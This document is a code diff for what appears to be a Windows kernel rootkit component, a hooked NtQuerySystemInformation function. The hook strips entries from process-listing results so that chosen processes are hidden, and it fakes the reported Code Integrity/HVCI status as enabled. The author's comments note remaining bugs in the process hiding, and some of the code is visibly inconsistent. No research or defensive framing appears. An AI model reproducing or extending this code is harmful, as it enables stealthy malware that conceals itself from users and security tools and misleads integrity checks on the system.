@@ -3,6 +3,9 @@
 #include <var.h>
 #include <wdm.h>
 
+//TODO! 2 BUGS TO FIX!
+//! 1: we should just call ExpQuerySystemInformation with the user's pointer and save the whole kernel-buffer nonsense/extra code.
+//! 2: the last process, and consecutive processes in the linked list aren't hidden currently.
 NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationClass, uint64_t* SystemInformation, uint32_t SystemInformationLength, uint32_t* ReturnLength)
 {
     _SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX* grpBuf = nullptr;
@@ -50,9 +53,6 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
             break;
     }
 
-    NTSTATUS exp_status = loc_ExpQuerySystemInformation(SystemInformationClass, grpBuf, grpBufSize, SystemInformation, SystemInformationLength, ReturnLength);
-    if (!NTSTATUS(exp_status)) return exp_status;
-
     // output: addr=SystemInformation, length=*ReturnLength
 
     switch (SystemInformationClass)
@@ -63,19 +63,20 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
         // SystemProcessInformation
         case 0x05: {
             // busywork
-            uint64_t size = 131072; // 128 KiB initial guess
+            uint64_t size = SystemInformationLength;
             PVOID buf;
             NTSTATUS s;
-            do
-            {
-                buf = ExAllocatePool2(POOL_FLAG_PAGED, size, 'NQSI');
-                if (!buf) return;
+            buf = ExAllocatePool2(POOL_FLAG_PAGED, size, 'NQSI');
+            if (!buf) return STATUS_INSUFFICIENT_RESOURCES;
 
-                s = loc_ExpQuerySystemInformation(0x05, grpBuf, grpBufSize, buf, size, &size);
-                if (!NT_SUCCESS(s)) ExFreePoolWithTag(buf, 'NQSI');
+            s = loc_ExpQuerySystemInformation(0x05, grpBuf, grpBufSize, buf, size, &size);
+            if (!NT_SUCCESS(s))
+            {
+                ExFreePoolWithTag(buf, 'NQSI');
+                if (s == STATUS_INFO_LENGTH_MISMATCH) return STATUS_INFO_LENGTH_MISMATCH;
+                else
+                    return s;
             }
-            while (s == STATUS_INFO_LENGTH_MISMATCH); // ReturnLength is written by the kernel on STATUS_INFO_LENGTH_MISMATCH
-            if (!NT_SUCCESS(s)) return s;
 
             // the real stuff
             _SYSTEM_PROCESS_INFORMATION* lastp = NULL;
@@ -94,7 +95,7 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
                 lastp = p;
                 p = (SYSTEM_PROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
             }
-            memcpy(SystemInformation, grpBuf, grpBufSize, buf, size);
+            memcpy(SystemInformation, buf, size);
             ExFreePoolWithTag(buf, 'NQSI');
             *ReturnLength = (uint32_t)size;
             return STATUS_SUCCESS;
@@ -106,18 +107,19 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
             NTSTATUS s;
 
             q.SessionId = session_id;
-            q.SizeOfBuf = 131072;
-            do
-            {
-                q.Buffer = ExAllocatePool2(POOL_FLAG_PAGED, size, 'NQSI');
-                if (!q.Buffer) return;
+            q.SizeOfBuf = SystemInformationLength;
 
-                // TODO review this; it's concerning. do i really pass in q and not q.Buffer?
-                s = loc_ExpQuerySystemInformation(0x35, &q, sizeof(q), NULL);
-                if (!NT_SUCCESS(s)) ExFreePoolWithTag(buf, 'NQSI');
+            q.Buffer = ExAllocatePool2(POOL_FLAG_PAGED, size, 'NQSI');
+            if (!q.Buffer) return STATUS_INSUFFICIENT_RESOURCES;
+
+            s = loc_ExpQuerySystemInformation(0x35, grpBuf, grpBufSize, &q, sizeof(q), NULL);
+            if (!NT_SUCCESS(s))
+            {
+                ExFreePoolWithTag(buf, 'NQSI');
+                if (s == STATUS_INFO_LENGTH_MISMATCH) return STATUS_INFO_LENGTH_MISMATCH;
+                else
+                    return s;
             }
-            while (s == STATUS_INFO_LENGTH_MISMATCH);
-            if (!NT_SUCCESS(s)) return s;
 
             // the real stuff
             _SYSTEM_PROCESS_INFORMATION* lastp = NULL;
@@ -133,7 +135,7 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
                 lastp = p;
                 p = (SYSTEM_PROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
             }
-            memcpy(SystemInformation, grpBuf, grpBufSize, buf, size);
+            memcpy(SystemInformation, buf, size);
             ExFreePoolWithTag(buf, 'NQSI');
             *ReturnLength = (uint32_t)size;
             return STATUS_SUCCESS;
@@ -141,19 +143,20 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
         // SystemExtendedProcessInformation
         case 0x39: {
             // busywork
-            uint64_t size = 262144;
+            uint64_t size = SystemInformationLength;
             PVOID buf;
             NTSTATUS s;
-            do
-            {
-                buf = ExAllocatePool2(POOL_FLAG_PAGED, size, 'NQSI');
-                if (!buf) return;
+            buf = ExAllocatePool2(POOL_FLAG_PAGED, size, 'NQSI');
+            if (!buf) return STATUS_INSUFFICIENT_RESOURCES;
 
-                s = loc_ExpQuerySystemInformation(0x39, buf, size, &size);
-                if (!NT_SUCCESS(s)) ExFreePoolWithTag(buf, 'NQSI');
+            s = loc_ExpQuerySystemInformation(0x39, grpBuf, grpBufSize, buf, size, &size);
+            if (!NT_SUCCESS(s))
+            {
+                ExFreePoolWithTag(buf, 'NQSI');
+                if (s == STATUS_INFO_LENGTH_MISMATCH) return STATUS_INFO_LENGTH_MISMATCH;
+                else
+                    return s;
             }
-            while (s == STATUS_INFO_LENGTH_MISMATCH);
-            if (!NT_SUCCESS(s)) return s;
 
             // the real stuff
             _SYSTEM_PROCESS_INFORMATION* lastp = NULL;
@@ -169,7 +172,7 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
                 lastp = p;
                 p = (SYSTEM_PROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
             }
-            memcpy(SystemInformation, grpBuf, grpBufSize, buf, size);
+            memcpy(SystemInformation, buf, size);
             ExFreePoolWithTag(buf, 'NQSI');
             *ReturnLength = (uint32_t)size;
             return STATUS_SUCCESS;
@@ -177,19 +180,20 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
         // SystemFullProcessInformation
         case 0x94: {
             // busywork
-            uint64_t size = 262144;
+            uint64_t size = SystemInformationLength;
             PVOID buf;
             NTSTATUS s;
-            do
-            {
-                buf = ExAllocatePool2(POOL_FLAG_PAGED, size, 'NQSI');
-                if (!buf) return;
+            buf = ExAllocatePool2(POOL_FLAG_PAGED, size, 'NQSI');
+            if (!buf) return STATUS_INSUFFICIENT_RESOURCES;
 
-                s = loc_ExpQuerySystemInformation(0x94, buf, size, &size);
-                if (!NT_SUCCESS(s)) ExFreePoolWithTag(buf, 'NQSI');
+            s = loc_ExpQuerySystemInformation(0x94, grpBuf, grpBufSize, buf, size, &size);
+            if (!NT_SUCCESS(s))
+            {
+                ExFreePoolWithTag(buf, 'NQSI');
+                if (s == STATUS_INFO_LENGTH_MISMATCH) return STATUS_INFO_LENGTH_MISMATCH;
+                else
+                    return s;
             }
-            while (s == STATUS_INFO_LENGTH_MISMATCH);
-            if (!NT_SUCCESS(s)) return s;
 
             // the real stuff
             _SYSTEM_PROCESS_INFORMATION* lastp = NULL;
@@ -205,7 +209,7 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
                 lastp = p;
                 p = (_SYSTEM_PROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
             }
-            memcpy(SystemInformation, grpBuf, grpBufSize, buf, size);
+            memcpy(SystemInformation, buf, size);
             ExFreePoolWithTag(buf, 'NQSI');
             *ReturnLength = (uint32_t)size;
             return STATUS_SUCCESS;
@@ -213,19 +217,20 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
         // SystemBasicProcessInformation
         case 0xFC: {
             // busywork
-            uint64_t size = 262144;
+            uint64_t size = SystemInformationLength;
             PVOID buf;
             NTSTATUS s;
-            do
-            {
-                buf = ExAllocatePool2(POOL_FLAG_PAGED, size, 'NQSI');
-                if (!buf) return;
+            buf = ExAllocatePool2(POOL_FLAG_PAGED, size, 'NQSI');
+            if (!buf) return STATUS_INSUFFICIENT_RESOURCES;
 
-                s = loc_ExpQuerySystemInformation(0xFC, buf, size, &size);
-                if (!NT_SUCCESS(s)) ExFreePoolWithTag(buf, 'NQSI');
+            s = loc_ExpQuerySystemInformation(0xFC, grpBuf, grpBufSize, buf, size, &size);
+            if (!NT_SUCCESS(s))
+            {
+                ExFreePoolWithTag(buf, 'NQSI');
+                if (s == STATUS_INFO_LENGTH_MISMATCH) return STATUS_INFO_LENGTH_MISMATCH;
+                else
+                    return s;
             }
-            while (s == STATUS_INFO_LENGTH_MISMATCH);
-            if (!NT_SUCCESS(s)) return s;
 
             // the real stuff
             _SYSTEM_BASICPROCESS_INFORMATION* lastp = NULL;
@@ -241,7 +246,7 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
                 lastp = p;
                 p = (_SYSTEM_BASICPROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
             }
-            memcpy(SystemInformation, grpBuf, grpBufSize, buf, size);
+            memcpy(SystemInformation, buf, size);
             ExFreePoolWithTag(buf, 'NQSI');
             *ReturnLength = (uint32_t)size;
             return STATUS_SUCCESS;
@@ -271,14 +276,15 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
             ci.Length = sizeof(ci);
             // basic spoof HVCI on; if this matters to you, also hook SystemIsolatedUserModeInformation etc
             // the important part is that the ENABLED bit is faked
-            ci.CodeIntegrityOptions = 0x0400 + 0x1000 + 0x0001;
+            ci.CodeIntegrityOptions = 0x2000 + 0x0400 + 0x1000 + 0x0001;
             memcpy(SystemInformation, &ci, sizeof(ci));
 
             return STATUS_SUCCESS;
         }
+        default: {
+            return loc_ExpQuerySystemInformation(SystemInformationClass, grpBuf, grpBufSize, SystemInformation, SystemInformationLength, ReturnLength);
+        }
     }
-
-    return exp_status;
 }
 
 // NTSTATUS __fastcall hooked_NtQuerySystemInformationEx(int32_t InfoClass, _SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX* InputBuffer, uint32_t InputBufferLength,
